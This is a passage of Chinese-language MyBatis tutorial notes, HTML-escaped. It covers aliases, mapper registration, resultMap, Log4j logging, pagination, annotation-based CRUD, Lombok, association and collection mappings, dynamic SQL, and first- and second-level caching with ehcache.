alias=&quot;User&quot;/&gt;&lt;/typeAliases&gt;\n\n也可以指定一个包名，MyBatis 会在包名下面搜索需要的 Java Bean，比如：\n扫描实体类的包，它的默认别名就为这个类的 类名，首字母小写！\n&lt;!--可以给实体类起别名--&gt;&lt;typeAliases&gt;    &lt;package name=&quot;com.kuang.pojo&quot;/&gt;&lt;/typeAliases&gt;\n\n\n\n在实体类比较少的时候，使用第一种方式。\n如果实体类十分多，建议使用第二种。\n第一种可以DIY别名，第二种则·不行·，如果非要改，需要在实体上增加注解\n@Alias(&quot;user&quot;)public class User &#123;&#125;\n\n5、设置这是 MyBatis 中极为重要的调整设置，它们会改变 MyBatis 的运行时行为。 \n\n\n6、其他配置\ntypeHandlers（类型处理器） \nobjectFactory（对象工厂） \nplugins插件\nmybatis-generator-core\nmybatis-plus\n通用mapper\n\n\n\n7、映射器（mappers）MapperRegistry：注册绑定我们的Mapper文件；\n方式一： 【推荐使用】\n&lt;!--每一个Mapper.XML都需要在Mybatis核心配置文件中注册！--&gt;&lt;mappers&gt;    &lt;mapper resource=&quot;com/kuang/dao/UserMapper.xml&quot;/&gt;&lt;/mappers&gt;\n\n方式二：使用class文件绑定注册\n&lt;!--每一个Mapper.XML都需要在Mybatis核心配置文件中注册！--&gt;&lt;mappers&gt;    &lt;mapper class=&quot;com.kuang.dao.UserMapper&quot;/&gt;&lt;/mappers&gt;\n\n注意点：\n\n接口和他的Mapper配置文件必须同名！\n接口和他的Mapper配置文件必须在同一个包下！\n\n方式三：使用扫描包进行注入绑定\n&lt;!--每一个Mapper.XML都需要在Mybatis核心配置文件中注册！--&gt;&lt;mappers&gt;    &lt;package name=&quot;com.kuang.dao&quot;/&gt;&lt;/mappers&gt;\n\n注意点：\n\n接口和他的Mapper配置文件必须同名！\n接口和他的Mapper配置文件必须在同一个包下！\n\n练习时间：\n\n将数据库配置文件外部引入\n实体类别名\n保证UserMapper 接口 和 UserMapper .xml 改为一致！并且放在同一个包下！\n\n8、生命周期和作用域\n生命周期，和作用域，是至关重要的，因为错误的使用会导致非常严重的并发问题。\nSqlSessionFactoryBuilder：\n\n一旦创建了 SqlSessionFactory，就不再需要它了\n局部变量\n\nSqlSessionFactory：\n\n说白了就是可以想象为 ：数据库连接池\nSqlSessionFactory 一旦被创建就应该在应用的运行期间一直存在，没有任何理由丢弃它或重新创建另一个实例。 \n因此 SqlSessionFactory 的最佳作用域是应用作用域。 \n最简单的就是使用单例模式或者静态单例模式。\n\nSqlSession\n\n连接到连接池的一个请求！\nSqlSession 的实例不是线程安全的，因此是不能被共享的，所以它的最佳的作用域是请求或方法作用域。\n用完之后需要赶紧关闭，否则资源被占用！\n\n\n这里面的每一个Mapper，就代表一个具体的业务！\n5、解决属性名和字段名不一致的问题1、 问题数据库中的字段\n\n新建一个项目，拷贝之前的，测试实体类字段不一致的情况\npublic class User &#123;        private int id;    private String name;    private String password;&#125;\n\n测试出现问题\n\n//    select * from mybatis.user where id = #&#123;id&#125;//类型处理器//    select id,name,pwd from mybatis.user where id = #&#123;id&#125;\n\n\n\n解决方法：\n\n起别名\n&lt;select id=&quot;getUserById&quot; resultType=&quot;com.kuang.pojo.User&quot;&gt;    select id,name,pwd as password from mybatis.user where id = #&#123;id&#125;&lt;/select&gt;\n\n2、resultMap结果集映射\nid   name   pwdid   name   password\n\n&lt;!--结果集映射--&gt;&lt;resultMap id=&quot;UserMap&quot; type=&quot;User&quot;&gt;    &lt;!--column数据库中的字段，property实体类中的属性--&gt;    &lt;result column=&quot;id&quot; property=&quot;id&quot;/&gt;    &lt;result column=&quot;name&quot; property=&quot;name&quot;/&gt;    &lt;result column=&quot;pwd&quot; property=&quot;password&quot;/&gt;&lt;/resultMap&gt;&lt;select id=&quot;getUserById&quot; resultMap=&quot;UserMap&quot;&gt;    select * from mybatis.user where id = #&#123;id&#125;&lt;/select&gt;\n\n\n\n\nresultMap 元素是 MyBatis 中最重要最强大的元素\nResultMap 的设计思想是，对于简单的语句根本不需要配置显式的结果映射，而对于复杂一点的语句只需要描述它们的关系就行了。\nResultMap 最优秀的地方在于，虽然你已经对它相当了解了，但是根本就不需要显式地用到他们。\n如果世界总是这么简单就好了。\n\n6、日志6.1、日志工厂如果一个数据库操作，出现了异常，我们需要排错。日志就是最好的助手！\n曾经：sout 、debug\n现在：日志工厂！\n\n\nSLF4J \n\nLOG4J  【掌握】\n\nLOG4J2\n\nJDK_LOGGING\n\nCOMMONS_LOGGING\n\nSTDOUT_LOGGING   【掌握】\n\nNO_LOGGING\n\n\n在Mybatis中具体使用那个一日志实现，在设置中设定！\nSTDOUT_LOGGING标准日志输出\n在mybatis核心配置文件中，配置我们的日志！\n&lt;settings&gt;    &lt;setting name=&quot;logImpl&quot; value=&quot;STDOUT_LOGGING&quot;/&gt;&lt;/settings&gt;\n\n\n6.2、Log4j什么是Log4j？\n\nLog4j是Apache 的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台 、文件、GUI 组件\n我们也可以控制每一条日志的输出格式；\n通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。\n通过一个配置文件 来灵活地进行配置，而不需要修改应用的代码。\n\n\n先导入log4j的包\n&lt;!-- https://mvnrepository.com/artifact/log4j/log4j --&gt;&lt;dependency&gt;    &lt;groupId&gt;log4j&lt;/groupId&gt;    &lt;artifactId&gt;log4j&lt;/artifactId&gt;    &lt;version&gt;1.2.17&lt;/version&gt;&lt;/dependency&gt;\n\nlog4j.properties\n#将等级为DEBUG的日志信息输出到console和file这两个目的地，console和file的定义在下面的代码log4j.rootLogger=DEBUG,console,file#控制台输出的相关设置log4j.appender.console = org.apache.log4j.ConsoleAppenderlog4j.appender.console.Target = System.outlog4j.appender.console.Threshold=DEBUGlog4j.appender.console.layout = org.apache.log4j.PatternLayoutlog4j.appender.console.layout.ConversionPattern=[%c]-%m%n#文件输出的相关设置log4j.appender.file = org.apache.log4j.RollingFileAppenderlog4j.appender.file.File=./log/kuang.loglog4j.appender.file.MaxFileSize=10mblog4j.appender.file.Threshold=DEBUGlog4j.appender.file.layout=org.apache.log4j.PatternLayoutlog4j.appender.file.layout.ConversionPattern=[%p][%d&#123;yy-MM-dd&#125;][%c]%m%n#日志输出级别log4j.logger.org.mybatis=DEBUGlog4j.logger.java.sql=DEBUGlog4j.logger.java.sql.Statement=DEBUGlog4j.logger.java.sql.ResultSet=DEBUGlog4j.logger.java.sql.PreparedStatement=DEBUG\n\n配置log4j为日志的实现\n&lt;settings&gt;    &lt;setting name=&quot;logImpl&quot; value=&quot;&quot;/&gt;&lt;/settings&gt;\n\nLog4j的使用！，直接测试运行刚才的查询\n\n\n\n简单使用\n\n在要使用Log4j 的类中，导入包  import org.apache.log4j.Logger;\n\n日志对象，参数为当前类的class\nstatic Logger logger = Logger.getLogger(UserDaoTest.class);\n\n日志级别\nlogger.info(&quot;info:进入了testLog4j&quot;);logger.debug(&quot;debug:进入了testLog4j&quot;);logger.error(&quot;error:进入了testLog4j&quot;);\n\n7、分页思考：为什么要分页？\n\n减少数据的处理量\n\n7.1、使用Limit分页语法：SELECT * from user limit startIndex,pageSize;SELECT * from user limit 3;  #[0,n]\n\n\n\n使用Mybatis实现分页，核心SQL\n\n接口\n//分页List&lt;User&gt; getUserByLimit(Map&lt;String,Integer&gt; map);\n\nMapper.xml\n&lt;!--//分页--&gt;&lt;select id=&quot;getUserByLimit&quot; parameterType=&quot;map&quot; resultMap=&quot;UserMap&quot;&gt;    select * from  mybatis.user limit #&#123;startIndex&#125;,#&#123;pageSize&#125;&lt;/select&gt;\n\n测试\n@Testpublic void getUserByLimit()&#123;SqlSession sqlSession = MybatisUtils.getSqlSession();UserMapper mapper = sqlSession.getMapper(UserMapper.class);HashMap&lt;String, Integer&gt; map = new HashMap&lt;String, Integer&gt;();    map.put(&quot;startIndex&quot;,1);    map.put(&quot;pageSize&quot;,2);    List&lt;User&gt; userList =  mapper.getUserByLimit(map);    for (User user : userList) &#123;    System.out.println(user);    &#125;    sqlSession.close();    &#125;\n\n7.2、RowBounds分页不再使用SQL实现分页\n\n接口\n//分页2List&lt;User&gt; getUserByRowBounds();\n\nmapper.xml\n&lt;!--分页2--&gt;&lt;select id=&quot;getUserByRowBounds&quot; resultMap=&quot;UserMap&quot;&gt;    select * from  mybatis.user&lt;/select&gt;\n\n测试\n@Testpublic void getUserByRowBounds()&#123;SqlSession sqlSession = MybatisUtils.getSqlSession();//RowBounds实现RowBounds rowBounds = new RowBounds(1, 2);//通过Java代码层面实现分页List&lt;User&gt; userList = sqlSession.selectList(&quot;com.kuang.dao.UserMapper.getUserByRowBounds&quot;,null,rowBounds);    for (User user : userList) &#123;    System.out.println(user);    &#125;    sqlSession.close();    &#125;\n\n7.3、分页插件\n了解即可，万一 以后公司的架构师，说要使用，你需要知道它是什么东西！\n8、使用注解开发8.1、面向接口编程- 大家之前都学过面向对象编程，也学习过接口，但在真正的开发中，很多时候我们会选择面向接口编程- 根本原因 :  &#x3D;&#x3D;解耦&#x3D;&#x3D; , 可拓展 , 提高复用 , 分层开发中 , 上层不用管具体的实现 , 大家都遵守共同的标准 , 使得开发变得容易 , 规范性更好- 在一个面向对象的系统中，系统的各种功能是由许许多多的不同对象协作完成的。在这种情况下，各个对象内部是如何实现自己的,对系统设计人员来讲就不那么重要了；- 而各个对象之间的协作关系则成为系统设计的关键。小到不同类之间的通信，大到各模块之间的交互，在系统设计之初都是要着重考虑的，这也是系统设计的主要工作内容。面向接口编程就是指按照这种思想来编程。\n关于接口的理解\n- 接口从更深层次的理解，应是定义（规范，约束）与实现（名实分离的原则）的分离。- 接口的本身反映了系统设计人员对系统的抽象理解。- 接口应有两类：  - 第一类是对一个个体的抽象，它可对应为一个抽象体(abstract class)；  - 第二类是对一个个体某一方面的抽象，即形成一个抽象面（interface）；- 一个体有可能有多个抽象面。抽象体与抽象面是有区别的。\n三个面向区别\n- 面向对象是指，我们考虑问题时，以对象为单位，考虑它的属性及方法 .- 面向过程是指，我们考虑问题时，以一个具体的流程（事务过程）为单位，考虑它的实现 .- 接口设计与非接口设计是针对复用技术而言的，与面向对象（过程）不是一个问题.更多的体现就是对系统整体的架构\n8.2、使用注解开发\n注解在接口上实现\n@Select(&quot;select * from user&quot;)List&lt;User&gt; getUsers();\n\n需要再核心配置文件中绑定接口！\n&lt;!--绑定接口--&gt;&lt;mappers&gt;    &lt;mapper class=&quot;com.kuang.dao.UserMapper&quot;/&gt;&lt;/mappers&gt;\n\n测试\n\n\n本质：反射机制实现\n底层：动态代理！\n \nMybatis详细的执行流程！\n\n8.3、CRUD我们可以在工具类创建的时候实现自动提交事务！\npublic static SqlSession  getSqlSession()&#123;    return sqlSessionFactory.openSession(true);&#125;\n\n\n\n编写接口，增加注解\npublic interface UserMapper &#123;    @Select(&quot;select * from user&quot;)    List&lt;User&gt; getUsers();    // 方法存在多个参数，所有的参数前面必须加上 @Param(&quot;id&quot;)注解    @Select(&quot;select * from user where id = #&#123;id&#125;&quot;)    User getUserByID(@Param(&quot;id&quot;) int id);    @Insert(&quot;insert into user(id,name,pwd) values (#&#123;id&#125;,#&#123;name&#125;,#&#123;password&#125;)&quot;)    int addUser(User user);        @Update(&quot;update user set name=#&#123;name&#125;,pwd=#&#123;password&#125; where id = #&#123;id&#125;&quot;)    int updateUser(User user);        @Delete(&quot;delete from user where id = #&#123;uid&#125;&quot;)    int deleteUser(@Param(&quot;uid&quot;) int id);&#125;\n\n\n\n测试类\n【注意：我们必须要讲接口注册绑定到我们的核心配置文件中！】\n关于@Param() 注解\n\n基本类型的参数或者String类型，需要加上\n引用类型不需要加\n如果只有一个基本类型的话，可以忽略，但是建议大家都加上！\n我们在SQL中引用的就是我们这里的 @Param() 中设定的属性名！\n\n#{}     ${} 区别\n9、LombokProject Lombok is a java library that automatically plugs into your editor and build tools, spicing up your java.Never write another getter or equals method again, with one annotation your class has a fully featured builder, Automate your logging variables, and much more.\n\n\njava library\nplugs\nbuild tools\nwith one annotation your class\n\n使用步骤：\n\n在IDEA中安装Lombok插件！\n\n在项目中导入lombok的jar包\n&lt;dependency&gt;    &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;    &lt;artifactId&gt;lombok&lt;/artifactId&gt;    &lt;version&gt;1.18.10&lt;/version&gt;&lt;/dependency&gt;\n\n在实体类上加注解即可！\n@Data@AllArgsConstructor@NoArgsConstructor\n\n@Getter and @Setter@FieldNameConstants@ToString@EqualsAndHashCode@AllArgsConstructor, @RequiredArgsConstructor and @NoArgsConstructor@Log, @Log4j, @Log4j2, @Slf4j, @XSlf4j, @CommonsLog, @JBossLog, @Flogger@Data@Builder@Singular@Delegate@Value@Accessors@Wither@SneakyThrows\n\n说明：\n@Data：无参构造，get、set、tostring、hashcode，equals@AllArgsConstructor@NoArgsConstructor@EqualsAndHashCode@ToString@Getter\n\n\n\n10、多对一处理多对一：\n\n\n多个学生，对应一个老师\n对于学生这边而言，  关联 ..  多个学生，关联一个老师  【多对一】\n对于老师而言， 集合 ， 一个老师，有很多学生 【一对多】\n\n\nSQL：\nCREATE TABLE `teacher` (  `id` INT(10) NOT NULL,  `name` VARCHAR(30) DEFAULT NULL,  PRIMARY KEY (`id`)) ENGINE=INNODB DEFAULT CHARSET=utf8INSERT INTO teacher(`id`, `name`) VALUES (1, &#x27;秦老师&#x27;); CREATE TABLE `student` (  `id` INT(10) NOT NULL,  `name` VARCHAR(30) DEFAULT NULL,  `tid` INT(10) DEFAULT NULL,  PRIMARY KEY (`id`),  KEY `fktid` (`tid`),  CONSTRAINT `fktid` FOREIGN KEY (`tid`) REFERENCES `teacher` (`id`)) ENGINE=INNODB DEFAULT CHARSET=utf8INSERT INTO `student` (`id`, `name`, `tid`) VALUES (&#x27;1&#x27;, &#x27;小明&#x27;, &#x27;1&#x27;); INSERT INTO `student` (`id`, `name`, `tid`) VALUES (&#x27;2&#x27;, &#x27;小红&#x27;, &#x27;1&#x27;); INSERT INTO `student` (`id`, `name`, `tid`) VALUES (&#x27;3&#x27;, &#x27;小张&#x27;, &#x27;1&#x27;); INSERT INTO `student` (`id`, `name`, `tid`) VALUES (&#x27;4&#x27;, &#x27;小李&#x27;, &#x27;1&#x27;); INSERT INTO `student` (`id`, `name`, `tid`) VALUES (&#x27;5&#x27;, &#x27;小王&#x27;, &#x27;1&#x27;);\n\n\n\n测试环境搭建\n导入lombok\n新建实体类 Teacher，Student\n建立Mapper接口\n建立Mapper.XML文件\n在核心配置文件中绑定注册我们的Mapper接口或者文件！【方式很多，随心选】\n测试查询是否能够成功！\n\n按照查询嵌套处理&lt;!--    思路:        1. 查询所有的学生信息        2. 根据查询出来的学生的tid，寻找对应的老师！  子查询    --&gt;&lt;select id=&quot;getStudent&quot; resultMap=&quot;StudentTeacher&quot;&gt;    select * from student&lt;/select&gt;&lt;resultMap id=&quot;StudentTeacher&quot; type=&quot;Student&quot;&gt;    &lt;result property=&quot;id&quot; column=&quot;id&quot;/&gt;    &lt;result property=&quot;name&quot; column=&quot;name&quot;/&gt;    &lt;!--复杂的属性，我们需要单独处理 对象： association 集合： collection --&gt;    &lt;association property=&quot;teacher&quot; column=&quot;tid&quot; javaType=&quot;Teacher&quot; select=&quot;getTeacher&quot;/&gt;&lt;/resultMap&gt;&lt;select id=&quot;getTeacher&quot; resultType=&quot;Teacher&quot;&gt;    select * from teacher where id = #&#123;id&#125;&lt;/select&gt;\n\n\n\n按照结果嵌套处理&lt;!--按照结果嵌套处理--&gt;&lt;select id=&quot;getStudent2&quot; resultMap=&quot;StudentTeacher2&quot;&gt;    select s.id sid,s.name sname,t.name tname    from student s,teacher t    where s.tid = t.id;&lt;/select&gt;&lt;resultMap id=&quot;StudentTeacher2&quot; type=&quot;Student&quot;&gt;    &lt;result property=&quot;id&quot; column=&quot;sid&quot;/&gt;    &lt;result property=&quot;name&quot; column=&quot;sname&quot;/&gt;    &lt;association property=&quot;teacher&quot; javaType=&quot;Teacher&quot;&gt;        &lt;result property=&quot;name&quot; column=&quot;tname&quot;/&gt;    &lt;/association&gt;&lt;/resultMap&gt;\n\n\n\n回顾Mysql 多对一查询方式：\n\n子查询\n联表查询\n\n11、一对多处理比如：一个老师拥有多个学生！\n对于老师而言，就是一对多的关系!\n环境搭建\n环境搭建，和刚才一样\n\n实体类\n@Datapublic class Student &#123;    private int id;    private String name;    private int tid;&#125;\n\n@Datapublic class Teacher &#123;    private int id;    private String name;    //一个老师拥有多个学生    private List&lt;Student&gt; students;&#125;\n\n\n\n\n\n按照结果嵌套处理&lt;!--按结果嵌套查询--&gt;&lt;select id=&quot;getTeacher&quot; resultMap=&quot;TeacherStudent&quot;&gt;    select s.id sid, s.name sname, t.name tname,t.id tid    from student s,teacher t    where s.tid = t.id and t.id = #&#123;tid&#125;&lt;/select&gt;&lt;resultMap id=&quot;TeacherStudent&quot; type=&quot;Teacher&quot;&gt;    &lt;result property=&quot;id&quot; column=&quot;tid&quot;/&gt;    &lt;result property=&quot;name&quot; column=&quot;tname&quot;/&gt;    &lt;!--复杂的属性，我们需要单独处理 对象： association 集合： collection    javaType=&quot;&quot; 指定属性的类型！    集合中的泛型信息，我们使用ofType获取    --&gt;    &lt;collection property=&quot;students&quot; ofType=&quot;Student&quot;&gt;        &lt;result property=&quot;id&quot; column=&quot;sid&quot;/&gt;        &lt;result property=&quot;name&quot; column=&quot;sname&quot;/&gt;        &lt;result property=&quot;tid&quot; column=&quot;tid&quot;/&gt;    &lt;/collection&gt;&lt;/resultMap&gt;\n\n\n\n按照查询嵌套处理&lt;select id=&quot;getTeacher2&quot; resultMap=&quot;TeacherStudent2&quot;&gt;    select * from mybatis.teacher where id = #&#123;tid&#125;&lt;/select&gt;&lt;resultMap id=&quot;TeacherStudent2&quot; type=&quot;Teacher&quot;&gt;    &lt;collection property=&quot;students&quot; javaType=&quot;ArrayList&quot; ofType=&quot;Student&quot; select=&quot;getStudentByTeacherId&quot; column=&quot;id&quot;/&gt;&lt;/resultMap&gt;&lt;select id=&quot;getStudentByTeacherId&quot; resultType=&quot;Student&quot;&gt;    select * from mybatis.student where tid = #&#123;tid&#125;&lt;/select&gt;\n\n\n\n小结\n关联 - association   【多对一】\n集合 - collection   【一对多】\njavaType    &amp;   ofType\nJavaType  用来指定实体类中属性的类型\nofType  用来指定映射到List或者集合中的 pojo类型，泛型中的约束类型！\n\n\n\n注意点：\n\n保证SQL的可读性，尽量保证通俗易懂\n注意一对多和多对一中，属性名和字段的问题！\n如果问题不好排查错误，可以使用日志 ， 建议使用 Log4j\n\n慢SQL       1s        1000s      \n面试高频\n\nMysql引擎\nInnoDB底层原理\n索引\n索引优化！\n\n12、动态 SQL&#x3D;&#x3D;什么是动态SQL：动态SQL就是指根据不同的条件生成不同的SQL语句&#x3D;&#x3D;\n利用动态 SQL 这一特性可以彻底摆脱这种痛苦。\n动态 SQL 元素和 JSTL 或基于类似 XML 的文本处理器相似。在 MyBatis 之前的版本中，有很多元素需要花时间了解。MyBatis 3 大大精简了元素种类，现在只需学习原来一半的元素便可。MyBatis 采用功能强大的基于 OGNL 的表达式来淘汰其它大部分元素。ifchoose (when, otherwise)trim (where, set)foreach\n\n\n\n搭建环境CREATE TABLE `blog` (  `id` varchar(50) NOT NULL COMMENT &#x27;博客id&#x27;,  `title` varchar(100) NOT NULL COMMENT &#x27;博客标题&#x27;,  `author` varchar(30) NOT NULL COMMENT &#x27;博客作者&#x27;,  `create_time` datetime NOT NULL COMMENT &#x27;创建时间&#x27;,  `views` int(30) NOT NULL COMMENT &#x27;浏览量&#x27;) ENGINE=InnoDB DEFAULT CHARSET=utf8\n\n\n\n创建一个基础工程\n\n导包\n\n编写配置文件\n\n编写实体类\n@Datapublic class Blog &#123;    private int id;    private String title;    private String author;    private Date createTime;    private int views;        &#125;\n\n编写实体类对应Mapper接口 和 Mapper.XML文件\n\n\nIF&lt;select id=&quot;queryBlogIF&quot; parameterType=&quot;map&quot; resultType=&quot;blog&quot;&gt;    select * from mybatis.blog where 1=1    &lt;if test=&quot;title != null&quot;&gt;        and title = #&#123;title&#125;    &lt;/if&gt;    &lt;if test=&quot;author != null&quot;&gt;        and author = #&#123;author&#125;    &lt;/if&gt;&lt;/select&gt;\n\nchoose (when, otherwise)&lt;select id=&quot;queryBlogChoose&quot; parameterType=&quot;map&quot; resultType=&quot;blog&quot;&gt;    select * from mybatis.blog    &lt;where&gt;        &lt;choose&gt;            &lt;when test=&quot;title != null&quot;&gt;                title = #&#123;title&#125;            &lt;/when&gt;            &lt;when test=&quot;author != null&quot;&gt;                and author = #&#123;author&#125;            &lt;/when&gt;            &lt;otherwise&gt;                and views = #&#123;views&#125;            &lt;/otherwise&gt;        &lt;/choose&gt;    &lt;/where&gt;&lt;/select&gt;\n\n\n\ntrim (where,set)select * from mybatis.blog&lt;where&gt;    &lt;if test=&quot;title != null&quot;&gt;        title = #&#123;title&#125;    &lt;/if&gt;    &lt;if test=&quot;author != null&quot;&gt;        and author = #&#123;author&#125;    &lt;/if&gt;&lt;/where&gt;\n\n&lt;update id=&quot;updateBlog&quot; parameterType=&quot;map&quot;&gt;    update mybatis.blog    &lt;set&gt;        &lt;if test=&quot;title != null&quot;&gt;            title = #&#123;title&#125;,        &lt;/if&gt;        &lt;if test=&quot;author != null&quot;&gt;            author = #&#123;author&#125;        &lt;/if&gt;    &lt;/set&gt;    where id = #&#123;id&#125;&lt;/update&gt;\n\n&#x3D;&#x3D;所谓的动态SQL，本质还是SQL语句 ， 只是我们可以在SQL层面，去执行一个逻辑代码&#x3D;&#x3D;\nif\nwhere ， set  ， choose ，when\nSQL片段有的时候，我们可能会将一些功能的部分抽取出来，方便复用！\n\n使用SQL标签抽取公共的部分\n&lt;sql id=&quot;if-title-author&quot;&gt;    &lt;if test=&quot;title != null&quot;&gt;        title = #&#123;title&#125;    &lt;/if&gt;    &lt;if test=&quot;author != null&quot;&gt;        and author = #&#123;author&#125;    &lt;/if&gt;&lt;/sql&gt;\n\n在需要使用的地方使用Include标签引用即可\n&lt;select id=&quot;queryBlogIF&quot; parameterType=&quot;map&quot; resultType=&quot;blog&quot;&gt;    select * from mybatis.blog    &lt;where&gt;        &lt;include refid=&quot;if-title-author&quot;&gt;&lt;/include&gt;    &lt;/where&gt;&lt;/select&gt;\n\n注意事项：\n\n最好基于单表来定义SQL片段！\n不要存在where标签\n\nForeachselect * from user where 1=1 and   &lt;foreach item=&quot;id&quot; collection=&quot;ids&quot;      open=&quot;(&quot; separator=&quot;or&quot; close=&quot;)&quot;&gt;        #&#123;id&#125;  &lt;/foreach&gt;(id=1 or id=2 or id=3)\n\n\n\n&lt;!--        select * from mybatis.blog where 1=1 and (id=1 or id = 2 or id=3)        我们现在传递一个万能的map ， 这map中可以存在一个集合！--&gt;&lt;select id=&quot;queryBlogForeach&quot; parameterType=&quot;map&quot; resultType=&quot;blog&quot;&gt;    select * from mybatis.blog    &lt;where&gt;        &lt;foreach collection=&quot;ids&quot; item=&quot;id&quot; open=&quot;and (&quot; close=&quot;)&quot; separator=&quot;or&quot;&gt;            id = #&#123;id&#125;        &lt;/foreach&gt;    &lt;/where&gt;&lt;/select&gt;\n\n\n\n&#x3D;&#x3D;动态SQL就是在拼接SQL语句，我们只要保证SQL的正确性，按照SQL的格式，去排列组合就可以了&#x3D;&#x3D;\n建议：\n\n现在Mysql中写出完整的SQL,再对应的去修改成为我们的动态SQL实现通用即可！\n\n13、缓存 （了解）13.1、简介查询  ：  连接数据库 ，耗资源！\t一次查询的结果，给他暂存在一个可以直接取到的地方！--&gt; 内存 ： 缓存\t我们再次查询相同数据的时候，直接走缓存，就不用走数据库了\n\n\n\n\n什么是缓存 [ Cache ]？\n\n存在内存中的临时数据。\n将用户经常查询的数据放在缓存（内存）中，用户去查询数据就不用从磁盘上(关系型数据库数据文件)查询，从缓存中查询，从而提高查询效率，解决了高并发系统的性能问题。\n\n\n为什么使用缓存？\n\n减少和数据库的交互次数，减少系统开销，提高系统效率。\n\n\n什么样的数据能使用缓存？\n\n经常查询并且不经常改变的数据。【可以使用缓存】\n\n\n\n13.2、Mybatis缓存\nMyBatis包含一个非常强大的查询缓存特性，它可以非常方便地定制和配置缓存。缓存可以极大的提升查询效率。\nMyBatis系统中默认定义了两级缓存：一级缓存和二级缓存\n默认情况下，只有一级缓存开启。（SqlSession级别的缓存，也称为本地缓存）\n\n二级缓存需要手动开启和配置，他是基于namespace级别的缓存。\n\n为了提高扩展性，MyBatis定义了缓存接口Cache。我们可以通过实现Cache接口来自定义二级缓存\n\n\n\n\n13.3、一级缓存\n一级缓存也叫本地缓存：  SqlSession\n与数据库同一次会话期间查询到的数据会放在本地缓存中。\n以后如果需要获取相同的数据，直接从缓存中拿，没必须再去查询数据库；\n\n\n\n测试步骤：\n\n开启日志！\n测试在一个Sesion中查询两次相同记录\n查看日志输出\n\n\n缓存失效的情况：\n\n查询不同的东西\n\n增删改操作，可能会改变原来的数据，所以必定会刷新缓存！\n\n\n查询不同的Mapper.xml\n\n手动清理缓存！\n\n\n\n小结：一级缓存默认是开启的，只在一次SqlSession中有效，也就是拿到连接到关闭连接这个区间段！\n一级缓存就是一个Map。\n13.4、二级缓存\n二级缓存也叫全局缓存，一级缓存作用域太低了，所以诞生了二级缓存\n基于namespace级别的缓存，一个名称空间，对应一个二级缓存；\n工作机制\n一个会话查询一条数据，这个数据就会被放在当前会话的一级缓存中；\n如果当前会话关闭了，这个会话对应的一级缓存就没了；但是我们想要的是，会话关闭了，一级缓存中的数据被保存到二级缓存中；\n新的会话查询信息，就可以从二级缓存中获取内容；\n不同的mapper查出的数据会放在自己对应的缓存（map）中；\n\n\n\n步骤：\n\n开启全局缓存\n&lt;!--显示的开启全局缓存--&gt;&lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt;\n\n在要使用二级缓存的Mapper中开启\n&lt;!--在当前Mapper.xml中使用二级缓存--&gt;&lt;cache/&gt;\n\n也可以自定义参数\n&lt;!--在当前Mapper.xml中使用二级缓存--&gt;&lt;cache  eviction=&quot;FIFO&quot;       flushInterval=&quot;60000&quot;       size=&quot;512&quot;       readOnly=&quot;true&quot;/&gt;\n\n测试\n\n问题:我们需要将实体类序列化！否则就会报错！\nCaused by: java.io.NotSerializableException: com.kuang.pojo.User\n\n\n\n小结：\n\n只要开启了二级缓存，在同一个Mapper下就有效\n所有的数据都会先放在一级缓存中；\n只有当会话提交，或者关闭的时候，才会提交到二级缓冲中！\n\n13.5、缓存原理\n13.6、自定义缓存-ehcacheEhcache是一种广泛使用的开源Java分布式缓存。主要面向通用缓存\n\n要在程序中使用ehcache，先要导包！\n&lt;!-- https://mvnrepository.com/artifact/org.mybatis.caches/mybatis-ehcache --&gt;&lt;dependency&gt;    &lt;groupId&gt;org.mybatis.caches&lt;/groupId&gt;    &lt;artifactId&gt;mybatis-ehcache&lt;/artifactId&gt;    &lt;version&gt;1.1.0&lt;/version&gt;&lt;/dependency&gt;\n\n在mapper中指定使用我们的ehcache缓存实现！\n&lt;!--在当前Mapper.xml中使用二级缓存--&gt;&lt;cache type=&quot;org.mybatis.caches.ehcache.EhcacheCache&quot;/&gt;\n\nehcache.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;ehcache xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:noNamespaceSchemaLocation=&quot;http://ehcache.org/ehcache.xsd&quot;         updateCheck=&quot;false&quot;&gt;    &lt;!--       diskStore：为缓存路径，ehcache分为内存和磁盘两级，此属性定义磁盘的缓存位置。参数解释如下：       user.home – 用户主目录       user.dir  – 用户当前工作目录       java.io.tmpdir – 默认临时文件路径     --&gt;    &lt;diskStore path=&quot;./tmpdir/Tmp_EhCache&quot;/&gt;        &lt;defaultCache            eternal=&quot;false&quot;            maxElementsInMemory=&quot;10000&quot;            overflowToDisk=&quot;false&quot;            diskPersistent=&quot;false&quot;            timeToIdleSeconds=&quot;1800&quot;            timeToLiveSeconds=&quot;259200&quot;            memoryStoreEvictionPolicy=&quot;LRU&quot;/&gt;     &lt;cache            name=&quot;cloud_user&quot;            eternal=&quot;false&quot;            maxElementsInMemory=&quot;5000&quot;            overflowToDisk=&quot;false&quot;            diskPersistent=&quot;false&quot;            timeToIdleSeconds=&quot;1800&quot;            timeToLiveSeconds=&quot;1800&quot;            memoryStoreEvictionPolicy=&quot;LRU&quot;/&gt;    &lt;!--       defaultCache：默认缓存策略，当ehcache找不到定义的缓存时，则使用这个缓存策略。只能定义一个。     --&gt;    &lt;!--      name:缓存名称。      maxElementsInMemory:缓存最大数目      maxElementsOnDisk：硬盘最大缓存个数。      eternal:对象是否永久有效，一但设置了，timeout将不起作用。      overflowToDisk:是否保存到磁盘，当系统当机时      timeToIdleSeconds:设置对象在失效前的允许闲置时间（单位：秒）。仅当eternal=false对象不是永久有效时使用，可选属性，默认值是0，也就是可闲置时间无穷大。      timeToLiveSeconds:设置对象在失效前允许存活时间（单位：秒）。最大时间介于创建时间和失效时间之间。仅当eternal=false对象不是永久有效时使用，默认是0.，也就是对象存活时间无穷大。      diskPersistent：是否缓存虚拟机重启期数据 Whether the disk store persists between restarts of the Virtual Machine. The default value is false.      diskSpoolBufferSizeMB：这个参数设置DiskStore（磁盘缓存）的缓存区大小。默认是30MB。每个Cache都应该有自己的一个缓冲区。      diskExpiryThreadIntervalSeconds：磁盘失效线程运行时间间隔，默认是120秒。      memoryStoreEvictionPolicy：当达到maxElementsInMemory限制时，Ehcache将会根据指定的策略去清理内存。默认策略是LRU（最近最少使用）。你可以设置为FIFO（先进先出）或是LFU（较少使用）。      clearOnFlush：内存数量最大时是否清除。      